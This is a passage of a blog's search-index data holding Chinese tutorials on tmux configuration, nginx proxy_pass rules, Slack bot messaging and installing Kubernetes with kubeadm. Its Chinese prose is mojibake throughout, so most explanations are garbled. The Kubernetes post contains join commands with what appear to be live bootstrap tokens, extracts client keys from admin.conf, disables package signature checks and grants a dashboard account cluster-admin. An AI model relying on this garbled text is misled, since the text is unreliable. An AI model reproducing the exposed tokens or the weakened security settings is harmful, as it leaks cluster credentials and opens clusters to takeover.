https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm\n  ```\n\n  é…ç½®å‚è€ƒ:\n\n  ```bash\n  set -g @tpm_plugins '          \\\n    tmux-plugins/tpm             \\\n  '\n  run '~/.tmux/plugins/tpm/tpm'\n  ```\n  \n  å®‰è£…:\n  \n  ```bash\n  Installing plugins\n  1. Add new plugin to ~/.tmux.conf with set -g @plugin '...'\n  ```\n2. Press prefix + I (capital i, as in Install) to fetch the plugin.\n\nYou're good to go! The plugin was cloned to ~/.tmux/plugins/ dir and sourced.\n  ```\n\n+ tmux-resurrect ä¿å­˜session\n\n  ```bash\n  <prefix> ctrl + s #save\n  <prefix> ctrl + r #load\n  ```\n\n\n\n### 3.3 ä¿®æ”¹Oh My Tmux é…ç½®\n\n  ```bash\n  tmux_conf_new_window_retain_current_path=true  #windowä¿æŒè·¯å¾„\n  tmux_conf_new_pane_reconnect_ssh=true  #é‡æ–°è¿æ¥ ssh\n  tmux_conf_new_session_prompt=true  #æ–°å»º session è¾“å…¥åå­—\n\n  #å·¦è¾¹çŠ¶æ€æ ç²¾ç®€\n  tmux_conf_theme_status_left=' â #S '  \n  \n  # å³è¾¹æ˜¾ç¤ºå¤©æ°”, å’Œweek of year\n  tmux_conf_theme_status_right='#{prefix}#{pairing}#{synchronized} | #(ipconfig getifaddr en0) | week-#(date +%V)'\n  \n  # å‰ç¼€æ˜¾ç¤º emoji\n  tmux_conf_theme_prefix='ğŸ ğŸ ğŸŠ ğŸ‹ ğŸŒ ğŸ‰ '\n \n  # å¤åˆ¶æ¨¡å¼ vi\n  set -g mode-keys vi\n  \n  # çŠ¶æ€æ æ”¾åˆ°ä¸Šé¢\n  set -g status-position top\n\n------------------------------------------------------------------\n\n  # Ctrl+Shift+Left  windowå‘å·¦(ä¸éœ€è¦prefix), Ctrl+Shift+Left windowå‘å³(ä¸éœ€è¦prefix)\n  #bind-key -n C-S-Left swap-window -t -1 \n  #bind-key -n C-S-Right swap-window -t +1 \n  #é“¾æ¥: https://superuser.com/a/552493\n  bind-key -n C-S-Left swap-window -t -1\\; select-window -t -1\n  bind-key -n C-S-Right swap-window -t +1\\; select-window -t +1\n\n  # æ’ä»¶ç›¸å…³, å‚è€ƒ3.2å®‰è£…æ’ä»¶æ­¥éª¤\n  set -g status-right 'Continuum status: #{continuum_status}'\n  set -g @continuum-save-interval '10'\n  set -g @continuum-restore 'on'\n\n  set -g @tpm_plugins '    \\\n  tmux-plugins/tpm            \\\n  tmux-plugins/tmux-open \\\n  tmux-plugins/tmux-yank\t\\\n  tmux-plugins/tmux-sensible  \\\n  tmux-plugins/tmux-resurrect  \\\n  tmux-plugins/tmux-continuum  \\\n  '\n  run '~/.tmux/plugins/tpm/tpm'\n  ```\n\n  \n\n# 4. tmux é‡åˆ°çš„é—®é¢˜\n\n### 4.1 off, é¼ æ ‡æ— æ³•æ»šåŠ¨\n\nIn iTerm2 all you need to do is to go to \n\nPreferences > Profile > Terminal and check â€˜Save lines to scrollback when an app status bar is presentâ€™.\n\n### 4.2 on, é¼ æ ‡æ— æ³•æ™ºèƒ½é€‰ä¸­\n\nå¿«é€Ÿå…³é—­, prefix+m\n\n### 4.3 æ— è®ºoff, on  é¼ æ ‡ç‚¹å‡»æ–‡ä»¶ä¸æ˜¯é»˜è®¤ app æ‰“å¼€\n\nhttps://stackoverflow.com/a/56715244/7062454\n\nè‡ªå·±å¼ºç­”ä¸€é¢˜: å…ˆé€€å‡º tmux seesion, ç”¨é¼ æ ‡ç‚¹å‡»é€šè¿‡é»˜è®¤ app æ‰“å¼€, å†è¿›å…¥ tmux session å°±å¯ä»¥äº†\n\n### 4.4 é¼ æ ‡æ— æ³•æ»šåŠ¨\n\n+ é‡ç½®iterm2\n\n  åˆ é™¤appå, æ¸…ç†ä¸€ä¸‹é…ç½®\n\n  ```bash\n  rm ~/Library/Application\\ Support/iTerm2\n  rm ~/Library/Preferences/com.googlecode.iterm2.*\n  ```\n\n+ é‡ç½® oh my tmux\n\n  ```bash\n  #å‡ºé—®é¢˜, å¤§æ¦‚ç‡.tmux.conf.local\n  ```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ http://louiszhai.github.io/2017/09/30/tmux/\n\n","tags":["iterm2"],"categories":["tmux"]},{"title":"nginxå¸¸è§proxy_passè§„åˆ™","url":"%2Fp%2F55856485.html","content":"\n# 1. æœ‰æ—  / ç»“å°¾\n\nåœ¨locationä¸­åŒ¹é…çš„urlæœ€åæœ‰æ— /ç»“å°¾ï¼ŒæŒ‡çš„æ˜¯æ¨¡ç³ŠåŒ¹é…ä¸ç²¾ç¡®åŒ¹é…çš„é—®é¢˜\nåœ¨proxy_passä¸­ä»£ç†çš„urlæœ€åæœ‰æ— /ç»“å°¾ï¼ŒæŒ‡çš„æ˜¯åœ¨proxy_pass æŒ‡å®šçš„urlåè¦ä¸è¦åŠ ä¸ŠlocationåŒ¹é…çš„urlçš„é—®é¢˜\n\n### 1.1 localtion åŠ ä¸åŠ  /\n\n+ location /abc/def  \n\n  å¯ä»¥åŒ¹é…/abc/defghiçš„è¯·æ±‚ï¼Œä¹Ÿå¯ä»¥åŒ¹é…/abc/def/ghi ......\n\n+ location /abc/def/  \n\n  ä¸èƒ½åŒ¹é…/abc/defghiçš„è¯·æ±‚ï¼Œåªèƒ½ç²¾ç¡®åŒ¹é… /abc/def/ghiè¿™æ ·çš„è¯·æ±‚\n\n<!-- more -->\n\n### 1.2 proxy_pass åŠ ä¸åŠ /\n\n```nginx\nlocation /star/ {\n\tproxy_pass http://ent.163.com;\n}\n\n#å¦‚æœæ˜¯location /star/ï¼Œhttp://abc.163.com/star/1.html ==> http://ent.163.com/star/1.htmlã€‚\n#å¦‚æœæ˜¯location /blog/ï¼Œhttp://abc.163.com/blog/1.html ==> http://ent.163.com/blog/1.htmlã€‚\n```\n\nlocationæ˜¯ä»€ä¹ˆï¼Œnginx å°±æŠŠlocation åŠ åœ¨proxy_pass çš„ server åé¢ ã€‚\n\n\n\n```nginx\nlocation /star/ {\n\tproxy_pass http://ent.163.com/;\n}\n\n#å¦‚æœæ˜¯location /star/, \thttp://abc.163.com/star/1.html ==> http://ent.163.com/1.htmlã€‚\n#å¦‚æœæ˜¯location /blog/,  http://abc.163.com/blog/1.html ==> http://ent.163.com/1.htmlã€‚\n```\n\n\næ”¹å˜locationï¼Œå¹¶ä¸èƒ½æ”¹å˜è¿”å›çš„å†…å®¹ï¼Œè¿”å›çš„å†…å®¹å§‹ç»ˆæ˜¯http://ent.163.com/ ã€‚\n\n\n\n\n# 2. åŒ¹é…å¹¶è½¬å‘å‚æ•°\n\néœ€æ±‚æ˜¯ `/api/camps/v1/teacher`   -> å…¶ä»–æœåŠ¡å™¨  `/api/v1/teacher `, å¹¶ä¸”è½¬å‘å‚æ•°\n\n```nginx\nlocation ~ ^/api/camps/v1/(.*)$ {\n            include /etc/nginx/proxy_params;\n            proxy_pass http://127.0.0.1:9082/api/v1/$1$is_args$args;\n  }\n```\n\n\n\n# 3. ä»£ç†ç›¸å¯¹è·¯å¾„\n\n### 3.1 å®Œå…¨è½¬å‘\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        location / {\n                proxy_pass https://www.liuvv.com/;\n        }\n\n}\n```\n\nhttp://159.75.75.191/  æ­¤æ—¶æ˜¯å®Œå…¨ä»£ç†çš„\n\n### 3.2 äºŒçº§è½¬å‘\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        location /liuvv/ {\n                proxy_pass https://www.liuvv.com/;\n        }\n}\n```\n\nhttp://159.75.75.191/liuvv/  æ­¤æ—¶ä¸€äº›å­url æ˜¯404, å› ä¸ºç›´æ¥æ‰“åˆ°äº† `/` è·¯å¾„\n\n##### 3.2.1 æ–¹æ¡ˆä¸€\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        location /liuvv/ {\n                proxy_pass https://www.liuvv.com/;\n        }\n\t       location / {\n               proxy_pass https://www.liuvv.com/;\n       }\n}\n```\n\n##### 3.2.1 æ–¹æ¡ˆäºŒ\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        location ^~ /liuvv/ {\n        \tproxy_pass https://www.liuvv.com/;\n        }\n        location ~ ^/([A-Za-z0-9]+) {\n        \tproxy_pass https://www.liuvv.com;\n        }\n        location / {\n    \t\t\treturn 403;\n        }\n}\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://stackoverflow.com/a/8130872/7062454\n+ https://serverfault.com/a/932636\n+ https://www.liuvv.com/p/51e59d76.html\n","tags":["nginx"],"categories":["nginx"]},{"title":"slackä»‹ç»å’Œæœºå™¨äººä½¿ç”¨","url":"%2Fp%2F68f05de.html","content":"\nç»å¸¸ç”¨çš„ bearychat å‡‰äº†(ä¼°è®¡å—ç–«æƒ…å½±å“),  è¿˜æœ‰å›½å†…çš„ç€‘å¸ƒIMä¹Ÿå‡‰äº†, ä¸å¾—ä¸é€‰ç”¨ä¸€ä¸ªæ–°çš„ä¼ä¸šåä½œå·¥å…·.\n\né‚£ä¹ˆåœ¨å›½å†…ä¸ºä»€ä¹ˆä¸é€‰ç”¨é’‰é’‰, é£ä¹¦, ä¼ä¸šå¾®ä¿¡? å“ˆå“ˆå“ˆä½ æ‡‚çš„. slack æ˜¯è°? ç®—æ˜¯å‰é¢çš„æ ‡æ†\n\n<!-- more -->\n\n# 1. ä½¿ç”¨\n\n### 1.1  æœºå™¨äººå®‰è£…\n\næ³¨æ„å…ˆä¸è¦ç”¨å®˜ç½‘æœ€æ–°çš„æ•™ç¨‹, æœ‰å‘!!!!  çœ‹è¿™ä¸ª https://github.com/slackapi/hubot-slack/issues/584#issuecomment-611808704\n\n+ Create a classic app from https://api.slack.com/apps?new_classic_app=1\n+ Go to **Features** > **OAuth & Permissions** > **Scopes**\n  + Click \"Add an OAuth Scope\"\n  + Search \"bot\" and choose it\n+ Go to **Features** > **App Home**\n  + Click \"Add Legacy Bot User\"\n  + Input \"Display Name\" and \"Default username\"\n  + Click \"Add\"\n+ Go to **Settings** > **Install App**\n  + Click \"Install App to Workspace\"\n  + Complete the OAuth flow\n\n\n\n### 1.2 å­—æ®µè¯´æ˜\n\n+ token\n\n  https://api.slack.com/apps?new_classic_app=1  \n\n  1. ç‚¹å‡» app è¿›å»\n\n  2. Features > OAuth & Permissions\n\n     çœ‹åˆ° User OAuth Token && Bot User OAuth Token\n\n+ teamid å’Œ channelId\n\n  ä»¥ä¸€ä¸ªåœ°å€ä¸ºä¾‹:  https://app.slack.com/client/T01PHQ4J7K/C01PL8L0Y65\n\n  T å¼€å¤´çš„æ˜¯ teamID\n\n  C å¼€å¤´çš„æ˜¯ channleID\n\n\n\n# 2. æœºå™¨äººå‘é€ä¿¡æ¯\n\n+ ä¸å»ºè®®ä½¿ç”¨ web hookapi, å› ä¸º channel è¿‡å¤šçš„æ—¶å€™ä¼šå¾ˆç´¯, å¹¶ä¸”åŠŸèƒ½ä¹Ÿå°‘\n\n+ æ³¨æ„ token æ˜¯æœºå™¨äººçš„ token, å³`Bot User OAuth Token`\n\n+ æ³¨æ„éœ€è¦æŠŠbot æ‹‰å…¥channel é‡Œ, `/invite @BOT_NAME`\n\n### 2.1 golang ä»£ç \n\n+ https://github.com/slack-go/slack/blob/master/examples/messages/messages.go\n\n\n```Â go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/slack-go/slack\"\n)\n\nfunc main() {\n\tapi := slack.New(\"YOUR_TOKEN_HERE\")\n\n\tattachment := slack.Attachment{\n\t\tPretext: \"some pretext\",\n\t\tText:    \"some text\",\n\t\t// Uncomment the following part to send a field too\n\t\t/*\n\t\t\tFields: []slack.AttachmentField{\n\t\t\t\tslack.AttachmentField{\n\t\t\t\t\tTitle: \"a\",\n\t\t\t\t\tValue: \"no\",\n\t\t\t\t},\n\t\t\t},\n\t\t*/\n\t}\n\n\tchannelID, timestamp, err := api.PostMessage(\n\t\t\"CHANNEL_ID\",\n\t\tslack.MsgOptionText(\"Some text\", false),\n\t\tslack.MsgOptionAttachments(attachment),\n\t\tslack.MsgOptionAsUser(true), // Add this if you want that the bot would post message as a user, otherwise it will send response using the default slackbot\n\t)\n\tif err != nil {\n\t\tfmt.Printf(\"%s\\n\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"Message successfully sent to channel %s at %s\", channelID, timestamp)\n}\n```\n\n### 2.2 python ä»£ç \n\npip3 install slack_sdk\n\n+ https://github.com/slackapi/python-slack-sdk#sending-a-message-to-slack\n\n```python\nimport os\nfrom slack_sdk import WebClient\nfrom slack_sdk.errors import SlackApiError\n\nclient = WebClient(token=os.environ['SLACK_BOT_TOKEN'])\n\ntry:\n    response = client.chat_postMessage(channel='#random', text=\"Hello world!\")\n    assert response[\"message\"][\"text\"] == \"Hello world!\"\nexcept SlackApiError as e:\n    # You will get a SlackApiError if \"ok\" is False\n    assert e.response[\"ok\"] is False\n    assert e.response[\"error\"]  # str like 'invalid_auth', 'channel_not_found'\n    print(f\"Got an error: {e.response['error']}\")\n```\n\n\n\n\n\n# 3. app ä½¿ç”¨\n\n### 3.1 è®¢é˜…githubæäº¤è®°å½•\n\n+ å®‰è£… github app\n\n+ è®¢é˜… github ä»“åº“ä¿¡æ¯\n  \n+ https://github.com/integrations/slack/issues/625#issuecomment-405638707\n  \n  ```bash\n  /github subscribe unix2dos/unix2dos.github.io commits:all\n  ```\n\n![image-20210228005233393](slack%E4%BB%8B%E7%BB%8D%E5%92%8C%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%BD%BF%E7%94%A8/image-20210228005233393.png)\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/slackapi/hubot-slack/issues/584 åˆ›å»ºæœºå™¨äºº\n+ https://github.com/slack-go/slack\n+ https://github.com/slackapi/python-slack-sdk\n+ https://stackoverflow.com/a/40408813/7062454\n","tags":["slack"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"k8sçš„å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2Fcaa8b60.html","content":"\n# 1. å®‰è£…\n\n### 1.1 å®‰è£…å‰è¦æ±‚\n\nMasteræœåŠ¡å™¨è¦2GB RAM å’Œ 2ä¸ª CPU, dockerå’Œ k8s åœ¨ master å’Œ node èŠ‚ç‚¹éƒ½éœ€è¦å®‰è£….\n\n<!-- more -->\n\n### 1.2 å®‰è£…docker\n\n```bash\napt update\napt install docker.io\n```\n\n### 1.3 å®‰è£…k8s\n\n```bash\n# ubuntu å®‰è£…\ncurl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -\n\ncat <<EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list\ndeb https://apt.kubernetes.io/ kubernetes-xenial main\nEOF\n\napt update\napt install -y kubelet kubeadm kubectl\n\n\n# centos å®‰è£…\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nEOF\n\nyum install -y kubelet kubeadm kubectl\n```\n\nä¿®æ”¹ç½‘ç»œé…ç½®\n\n```bash\ncat <<EOF > /etc/sysctl.d/k8s.conf\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nEOF\n\nsysctl --system\n```\n\nç¦æ­¢ swap\n\n```bash\nswapoff -a\n```\n\n\n\n# 2. æ“ä½œ\n\n### 2.1 kubeadm åˆ›å»º\n\n```bash\nkubeadm init\n\n# æ˜¾ç¤ºä¸‹é¢å°±æ˜¯æˆåŠŸäº†\nYour Kubernetes control-plane has initialized successfully!\nkubeadm join 10.128.0.2:6443 --token essacx.dirj093suimneobu \\\n    --discovery-token-ca-cert-hash sha256:ccfba722f83313d31e27249300501ea88ef0560d7674b7a063fca5b2a3db357c\n```\n\nå¦‚æœå®‰è£…è¿‡ç¨‹å‡ºç°é—®é¢˜, é‡ç½®\n\n```bash\nkubeadm reset\nsystemctl stop kubelet\nsystemctl stop docker\nrm -rf /var/lib/cni/\nrm -rf /var/lib/calico/\nrm -rf /var/lib/kubelet/*\nrm -rf /etc/cni/\n\nsystemctl start docker\nsystemctl start kubelet\nkubeadm init\n```\n\n\n\n### 2.2 è·å– node ä¿¡æ¯\n\n```bash\nkubectl get nodes -o wide\n# æŠ¥é”™\nerror: no configuration has been provided, try setting KUBERNETES_MASTER environment variable\n\n# é rootç”¨æˆ·\nmkdir -p HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf HOME/.kube/config\nsudo chown (id -u):(id -g) $HOME/.kube/config\n\n#root ç”¨æˆ·\nexport KUBECONFIG=/etc/kubernetes/admin.conf\n```\n\nå†æ¬¡è·å–å¯çœ‹åˆ°çŠ¶æ€\n\n```bash\nkubectl get nodes # æ­¤å¤„çš„NotReadyæ˜¯å› ä¸ºç½‘ç»œè¿˜æ²¡é…ç½®.\nNAME   STATUS     ROLES    AGE   VERSION\nus     NotReady   master   10m   v1.18.2\n```\n\n\n\n### 2.3 é…ç½®ç½‘ç»œ\n\né€‰ä¸€ä¸ªå³å¯\n\n+ å®‰è£…Calico\n\n```bash\nwget https://docs.projectcalico.org/v3.11/manifests/calico.yaml\n\n\n# calico.yaml æ–‡ä»¶æ·»åŠ ä»¥ä¸‹äºŒè¡Œ\n- name: IP_AUTODETECTION_METHOD\n\tvalue: \"interface=ens.*\"  # ens æ ¹æ®å®é™…ç½‘å¡å¼€å¤´é…ç½®\n\n\nkubectl delete -f calico.yaml\nkubectl apply -f calico.yaml\n```\n\n+ å®‰è£… flannel\n\n```bash\nwget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml\n\nkubectl delete -f kube-flannel.yml\nkubectl apply -f kube-flannel.yml\n```\n\n\n\n### 2.4 æ·»åŠ WorkerèŠ‚ç‚¹\n\n```bash\n# è·å– nodes\nkubectl get nodes -o wide\n\n# åˆ é™¤ nodes\nkubectl delete nodes tencent\n\n# åœ¨è¢«åˆ é™¤çš„nodeèŠ‚ç‚¹æ¸…ç©ºé›†ç¾¤ä¿¡æ¯\nkubeadm reset\n\n# åœ¨masterèŠ‚ç‚¹æŸ¥çœ‹é›†ç¾¤çš„tokenå€¼(åœ¨ master æœºå™¨æ“ä½œ)\nkubeadm token create --print-join-command\n\n# å°†nodeèŠ‚ç‚¹é‡æ–°æ·»åŠ åˆ°k8sé›†ç¾¤ä¸­(åœ¨ node æœºå™¨æ“ä½œ)\nkubeadm join 10.128.0.2:6443 --token oa5h63.wylpy4upqzp5nxl4     --discovery-token-ca-cert-hash sha256:182bf7a949b7cad1511df0b38e340dde0196084522132ab6a32da1ae9e4c9d1a\n```\n\n\n\n# 3. åº”ç”¨éƒ¨ç½²\n\n### 3.1 nginx\n\n```bash\nvi nginx-pod.yaml\n\napiVersion: v1      # æè¿°æ–‡ä»¶æ‰€éµå¾ªKubernetesAPIçš„ç‰ˆæœ¬\nkind: Pod           # æè¿°çš„ç±»å‹æ˜¯pod\nmetadata:\n  name: nginx-pod   # podçš„åç§°\n  labels:           # æ ‡ç­¾\n    app: nginx-pod\n    env: test\nspec:\n  containers:\n    - name: nginx-pod     # å®¹å™¨å\n      image: nginx:1.15   # é•œåƒåç§°åŠç‰ˆæœ¬\n      imagePullPolicy: IfNotPresent   # å¦‚æœæœ¬åœ°ä¸å­˜åœ¨å°±å»è¿œç¨‹ä»“åº“æ‹‰å–\n      ports:\n        - containerPort: 80   # podå¯¹å¤–ç«¯å£\n  restartPolicy: Always\n```\nåº”ç”¨å’Œåˆ é™¤\n```bash\nkubectl apply -f nginx-pod.yaml  # åº”ç”¨\nkubectl delete -f nginx-pod.yaml # åˆ é™¤\n```\n\næ³¨æ„, nginx æ˜¯åœ¨ node èŠ‚ç‚¹ä¸Šé¢è¿è¡Œçš„, è€Œä¸æ˜¯ master, å¯ä»¥é€šè¿‡ docker ps æŸ¥çœ‹\n\n\n\n+ è®¿é—®nginx\n\n  æƒ³è¦è®¿é—®åˆ°podä¸­çš„æœåŠ¡, æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯é€šè¿‡ç«¯å£è½¬å‘, æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤, å°†å®¿ä¸»æœºçš„`9999`ç«¯å£ä¸nginx-podçš„`80`ç«¯å£ç»‘å®š:\n\n  ```bash\n  kubectl port-forward --address 0.0.0.0 nginx-pod 9999:80\n  ```\n\n  ç„¶ååœ¨ master èº«ä¸Šè®¿é—®\n\n  ```bash\n  curl localhost:9999\n  ```\n\n  \n\n\n\n# 4. éƒ¨ç½²å›¾å½¢ç•Œé¢\n\n### 4.1 ä¸‹è½½\n\n  https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/\n\n```bash\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\nkubectl get pods --all-namespaces \n# éƒ¨ç½²å®Œæ¯•å, æ‰§è¡Œå¯ä»¥çœ‹åˆ°æœ‰ dashboard\n```\n\n\n\n### 4.2 åˆ›å»ºç”¨æˆ·\n\n+ vi dashboard-adminuser.yaml\n\n  æŒ‰ç…§ä¸‹é¢çš„å»å†™, å¦åˆ™å¯èƒ½æœ‰æƒé™é—®é¢˜\n\n```bash\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: admin-user\n  namespace: kube-system\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: admin-user\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: admin-user\n  namespace: kube-system\n```\n\n\n\n```bash\nkubectl apply -f dashboard-adminuser.yaml\n# æ˜¾ç¤º clusterrolebinding.rbac.authorization.k8s.io/admin-user created\n```\n\n\n\n### 8.3 è®¿é—®dashboard\n\nhttps://34.66.187.249:6443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy\n\næŠ¥é”™  \"message\": \"services \\\"https:kubernetes-dashboard:\\\" is forbidden: User \\\"system:anonymous\\\" cannot get resource \\\"services/proxy\\\" in API group \\\"\\\" in the namespace \\\"kubernetes-dashboard\\\"\",\n\n\nè¿™ä¸ªæ˜¯å› ä¸ºkubernetesåŸºäºå®‰å…¨æ€§çš„è€ƒè™‘ï¼Œæµè§ˆå™¨å¿…é¡»è¦ä¸€ä¸ªæ ¹è¯ä¹¦ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»\n\n```bash\n# ç”Ÿæˆcrt\ngrep 'client-certificate-data' /etc/kubernetes/admin.conf | head -n 1 | awk '{print $2}' | base64 -d >> kubecfg.crt\n\n# ç”Ÿæˆkeyæ–‡ä»¶\ngrep 'client-key-data' /etc/kubernetes/admin.conf | head -n 1 | awk '{print $2}' | base64 -d >> kubecfg.key\n\n# ç”Ÿæˆp12è¯ä¹¦æ–‡ä»¶ï¼ˆè¯ä¹¦çš„ç”Ÿæˆå’Œå¯¼å…¥éœ€è¦ä¸€ä¸ªå¯†ç , å»ºè®®è¾“å…¥å¯†ç ï¼‰\nopenssl pkcs12 -export -clcerts -inkey kubecfg.key -in kubecfg.crt -out kubecfg.p12 -name \"kubernetes-client\"\n```\n\n\n\nkubecfg.p12å³éœ€è¦å¯¼å…¥å®¢æˆ·ç«¯æœºå™¨çš„è¯ä¹¦. å°†è¯ä¹¦æ‹·è´åˆ°å®¢æˆ·ç«¯æœºå™¨ä¸Š(è‡ªå·±çš„ç”µè„‘), å¯¼å…¥å³å¯(ç™»å½•é’¥åŒ™é“¾å¹¶ä¸”å§‹ç»ˆä¿¡ä»»). \nå†æ¬¡ç™»å½•æ—¶ä¼šæç¤ºé€‰æ‹©è¯ä¹¦, ç¡®è®¤åä¼šæç¤ºè¾“å…¥å½“å‰ç”¨æˆ·åå¯†ç (æ³¨æ„æ˜¯ç”µè„‘çš„ç”¨æˆ·åå¯†ç )\n\n```bash\n# æ‰§è¡Œ, å¤åˆ¶ token åˆ°æµè§ˆå™¨å³å¯\nkubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}')\n```\n\n\n\n# 5. é”™è¯¯é—®é¢˜æ€»ç»“\n\n### 5.1 å¦‚ä½•åœæ­¢ kube-schedule\n\n```bash\nsystemctl stop kubelet\n```\n\n### 5.2 dashboardæ— æ³•æŸ¥çœ‹çš„é—®é¢˜\n\nnodes is forbidden: User \"system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard\" cannot list resource \"nodes\" in API group \"\" at the cluster scope\n\nå…¶å®å¾ˆæ˜æ˜¾å°±æ˜¯ç”¨æˆ·system:serviceaccount:kubernetes-dashboard:kubernetes-dashboardæ²¡æœ‰ç›¸å…³æƒé™\n\nä¿®æ”¹dashboard-adminuser.yaml å¦‚ä¸Šæ–‡æ‰€ç¤ºå³å¯\n\n### 5.3 é•œåƒæ‹‰å–å¤±è´¥ GFW\n\nFailed to create pod sandbox: rpc error: code = Unknown desc = failed pulling image \"k8s.gcr.io/pause:3.1\": Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n\nMountVolume.SetUp failed for volume \"kube-proxy\" : failed to sync configmap cache: timed out waiting for the condition\n\nFailed to pull image \"k8s.gcr.io/kube-proxy:v1.18.2\": rpc error: code = Unknown desc = Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1\ndocker tag  registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 k8s.gcr.io/pause:3.1\n\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.18.2 \ndocker tag  registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.18.2   k8s.gcr.io/kube-proxy:v1.18.2\n```\n\n### 5.4  calicoæ— æ³•å¯åŠ¨\n\n Readiness probe failed: calico/node is not ready: felix is not ready: Get http://localhost:9099/readiness: dial tcp 127.0.0.1:9099: connect: connection refused\n\nä¿®æ”¹calico.yaml, å¢åŠ `IP_AUTODETECTION_METHOD`ç¯å¢ƒå˜é‡, åœ¨ IP çš„ä¸‹é¢\n\n```bash\n- name: IP\n\tvalue: \"autodetect\"\n- name: IP_AUTODETECTION_METHOD\n\tvalue: \"interface=eth.*\"\n```\n\né‡å¯calico\n\n```bash\nkubectl delete -f calico.yaml\nkubectl apply -f calico.yaml\n```\n\n\n\n### 5.5 node æ— æ³• join\n\n [ERROR FileContentâ€“proc-sys-net-ipv4-ip_forward]: /proc/sys/net/ipv4/ip_forward contents are not set to 1\n\n```bash\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n\n\n# 6. å¸¸ç”¨å‘½ä»¤\n\n```bash\n# æŸ¥çœ‹çŠ¶æ€\nkubectl get nodes --all-namespaces -o wide\nkubectl get pods --all-namespaces -o wide\n\n\n# æŸ¥çœ‹ pod ä¿¡æ¯\nkubectl describe pods name\nkubectl describe pods -n kube-system name\n\n\n# è·å– token, åŠ å…¥\nkubeadm token create --print-join-command\n\n\n# æ¸…ç†\nkubeadm reset\nrm -rf /var/lib/cni/ && rm -rf /var/lib/calico/ && rm -rf /var/lib/kubelet/ && rm -rf /etc/cni/\nkubeadm init\n```\n\n\n\n# 7. å‚è€ƒæ•™ç¨‹\n\n+ https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\n+ https://juejin.im/post/5d7fb46d5188253264365dcf\n+ https://juejin.im/post/5e1e96ef6fb9a02fbd378588\n","tags":["k8s"],"categories":["k8s"]},{"title":"k8sçš„åˆæ¬¡æ¼”ç»ƒ","url":"%2Fp%2F890e8359.html","content":"\nKubernetesä¸­çš„å¤§éƒ¨åˆ†æ¦‚å¿µNodeã€Podã€Replication Controllerã€Serviceç­‰éƒ½å¯ä»¥çœ‹ä½œä¸€ç§â€œèµ„æºå¯¹è±¡â€ï¼Œå‡ ä¹æ‰€æœ‰çš„èµ„æºå¯¹è±¡éƒ½å¯ä»¥é€šè¿‡kubectlå·¥å…·ï¼ˆAPIè°ƒç”¨ï¼‰æ‰§è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥ç­‰æ“ä½œå¹¶å°†å…¶ä¿å­˜åœ¨etcdä¸­æŒä¹…åŒ–å­˜å‚¨ã€‚\n\nä»è¿™ä¸ªè§’åº¦æ¥çœ‹ï¼Œkuberneteså…¶å®æ˜¯ä¸€ä¸ªé«˜åº¦è‡ªåŠ¨åŒ–çš„èµ„æºæ§åˆ¶ç³»ç»Ÿï¼Œé€šè¿‡è·Ÿè¸ªå¯¹æ¯”etcdåº“é‡Œä¿å­˜çš„â€œèµ„æºæœŸæœ›çŠ¶æ€â€ä¸å½“å‰ç¯å¢ƒä¸­çš„â€œå®é™…èµ„æºçŠ¶æ€â€çš„å·®å¼‚æ¥å®ç°è‡ªåŠ¨æ§åˆ¶å’Œè‡ªåŠ¨çº é”™çš„é«˜çº§åŠŸèƒ½ã€‚\n\n<!-- more -->\n\n\n# 1. Kubernetes æœ¬åœ°å®‰è£…\n\næˆ‘ä»¬éœ€è¦å®‰è£…ä»¥ä¸‹ä¸œè¥¿ï¼šKubernetes çš„å‘½ä»¤è¡Œå®¢æˆ·ç«¯ 